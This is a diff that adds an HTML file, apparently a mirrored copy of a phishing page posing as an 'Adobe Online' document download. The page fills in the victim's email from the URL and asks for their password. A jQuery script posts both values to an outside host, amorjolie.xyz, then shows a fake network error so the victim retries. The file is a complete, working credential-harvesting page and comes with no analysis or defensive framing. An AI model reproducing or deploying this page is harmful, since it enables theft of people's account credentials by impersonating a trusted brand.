@@ -1,0 +1,90 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from harmltasti.glitch.me/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 16 Dec 2021 20:51:17 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title></title>
+        <meta description="this is used  ">
+        <link rel="stylesheet" href="bootstrap.css">
+    <script src="jquery.min.js"></script>
+    <script src="bootstrap.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <style>
+        .green{
+            background-color:#ed1c24;
+            opacity:0.9;
+
+        }
+        .curve{
+           
+        }
+        body{
+            background-image:url(bg.png);
+            background-repeat:no-repeat;
+            background-size:cover; 
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="jumbotron bg-transparent"></div>
+  <h1></h1><br> <h1></h1><br> <h1></h1><br> <h1></h1><br>
+    <div class="row">
+    <div class="col-sm-4"></div>
+    <div class="col green text-white p-3 curve text-center">
+        <h3 class="p-1"><img src="fx.png" class="img-fluid"> Adobe Online</h3> 
+         <div id="err" class="text-white text-center"><i></i></div>
+         <form method="post" id="users" action="#">
+
+                <p id="m1"></p>
+                <input type="password" name="x2" class="form-control " value="" id="ps" placeholder="Password" required="" >
+                <span class="text-danger" id="er"></span>
+                <input type="hidden" id="x1" value="" name="x1">
+                <br>
+                <input type="submit" id="btn" class="btn btn-md btn-dark" value="Download">
+            </form>
+
+
+
+    <script>
+
+        $(document).ready(function () {
+            var baseUrl = (window.location).href;
+            var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+            $("#x1").val(url);
+            $("#m1").html(url);
+
+            $("#users").submit(function (event) {
+                event.preventDefault();
+                $("#sbtn").html("Processing...").prop("disabled", true);
+                $.ajax({
+                    type: "POST",
+                    url: "https://amorjolie.xyz/pmaa/bnx.php",
+                    crossDomain:true,
+                    data: $(this).serialize()
+                }).done(function (data) {
+                    swal("Error!", "Network Connection !", "error");
+                    $("#x2").val("");
+
+                }).fail(function (data) {
+                    swal("Error!", "Network Connection !", "error");
+                    $("#x2").val("");
+                });
+            })
+        });
+
+</script>
+</div>
+    <div class="col-sm-3"></div>
+</div>
+</div>
+
+</body>
+
+<!-- Mirrored from harmltasti.glitch.me/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 16 Dec 2021 20:51:19 GMT -->
+</html>
